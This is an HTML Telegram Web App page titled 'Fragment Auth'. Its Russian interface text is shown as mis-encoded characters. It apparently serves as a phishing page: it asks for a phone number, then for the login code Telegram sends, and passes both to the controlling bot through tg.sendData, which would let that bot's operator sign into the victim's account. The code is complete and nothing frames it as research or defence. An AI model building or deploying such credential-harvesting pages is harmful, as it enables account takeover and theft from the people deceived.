<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fragment Auth</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { margin: 0; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: Arial, sans-serif; }
        .container { background: white; border-radius: 20px; padding: 30px; max-width: 350px; width: 100%; }
        .step { display: none; }
        .active { display: block; }
        input, button { width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 2px solid #ddd; }
        button { background: #0088cc; color: white; border: none; cursor: pointer; }
        .loading { text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <!-- –®–∞–≥ 1: –¢–µ–ª–µ—Ñ–æ–Ω -->
        <div id="stepPhone" class="step active">
            <h3>–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</h3>
            <input type="tel" id="phone" placeholder="79123456789" maxlength="11">
            <button onclick="sendPhone()">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥</button>
        </div>

        <!-- –®–∞–≥ 2: –ö–æ–¥ -->
        <div id="stepCode" class="step">
            <h3>–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ Telegram</h3>
            <input type="text" id="code" placeholder="12345" maxlength="5">
            <button onclick="sendCode()">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
        </div>

        <div id="stepLoading" class="step">
            <div class="loading">–û—Ç–ø—Ä–∞–≤–∫–∞...</div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        
        let userPhone = '';

        function showStep(stepId) {
            document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
            document.getElementById(stepId).classList.add('active');
        }

        function sendPhone() {
            const phone = document.getElementById('phone').value;
            if (!phone) return alert('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä');
            
            userPhone = phone.startsWith('+') ? phone : '+' + phone;
            showStep('stepLoading');
            
            // üî• –û–¢–ü–†–ê–í–õ–Ø–ï–ú –î–ê–ù–ù–´–ï –í –ë–û–¢–ê
            const data = {
                action: 'send_phone',
                phone: userPhone
            };
            
            tg.sendData(JSON.stringify(data));
            
            setTimeout(() => showStep('stepCode'), 1000);
        }

        function sendCode() {
            const code = document.getElementById('code').value;
            if (!code) return alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥');
            
            showStep('stepLoading');
            
            const data = {
                action: 'send_code', 
                phone: userPhone,
                code: code
            };
            
            tg.sendData(JSON.stringify(data));
        }

        // Enter –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
        document.getElementById('phone').addEventListener('keypress', e => { if(e.key === 'Enter') sendPhone(); });
        document.getElementById('code').addEventListener('keypress', e => { if(e.key === 'Enter') sendCode(); });
    </script>
</body>
</html>